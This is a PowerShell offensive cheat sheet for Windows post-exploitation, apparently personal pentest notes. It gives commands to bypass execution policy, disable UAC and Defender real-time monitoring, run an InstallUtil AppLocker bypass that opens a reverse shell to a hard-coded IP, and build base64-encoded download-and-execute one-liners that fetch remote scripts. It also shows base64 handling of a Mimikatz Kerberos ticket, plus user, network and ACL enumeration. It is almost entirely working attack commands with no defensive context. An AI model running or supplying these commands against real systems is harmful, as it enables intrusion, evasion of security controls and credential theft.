
###  Process
```
powershell get-item function:
Get-Process | Where-Object {$_.ProcessName –eq "explorer"}
Get-Process | ? {$_.ProcessName –eq “explorer”} | select Id,Handles
(Get-Process | ? {$_.ProcessName –eq “explorer”}).Id
```

### Bypass
```
PowerShell.exe -ExecutionPolicy Bypass -File .\runme.ps1
PowerShell.exe -ExecutionPolicy UnRestricted -File .runme.ps1
PowerShell.exe -ExecutionPolicy Remote-signed -File .runme.ps1
$ExecutionContext.SessionState.LanguageMode
Set-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -Value 0 #Disable UAC

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /U c:\temp\psby.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe

```
### Antivirus
```
Get-MpComputerStatus #Check status
Set-MpPreference -DisableRealtimeMonitoring $true #Disable
```
### User
```
Get-LocalUser | ft Name,Enabled,Description,LastLogon
Get-ChildItem C:\Users -Force | select Name
```
### AppLockerPolicy
```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
Get-ChildItem 'C:\Windows\temp*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}
Get-ChildItem 'C:\Windows\tasks*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}
Get-ChildItem 'C:\Windows\tracing*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}} 
 
```
### Network
```
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
Get-Content C:\WINDOWS\System32\drivers\etc\hosts
```
### Download & Execute From Linux
```

echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.99.110/shell123.ps1')" | iconv -t UTF-16LE | base64 -w 0
powershell -nop -enc <BASE64_ENCODED_PAYLOAD>

```
### PS Base64 Encode
```
$OriginalCommand = '#{powershell_command}'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand
$OriginalCommand = "iex (New-Object Net.WebClient).DownloadString('http://10.8.0.166:80/download/file.ps1')"
[System.Convert]::ToBase64String([System.Text.Encoding]::unicode.GetBytes($OriginalCommand))
```
```
[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\Commando\Desktop\Mimikatz_x64\zps.kirbi"))
[System.IO.File]::WriteAllBytes("C:\Users\Commando\Desktop\Mimikatz_x64\zps.kirbi", [System.Convert]::FromBase64String("do"))
[System.Text.Encoding]::unicode.GetString([System.Convert]::FromBase64String(""))
```
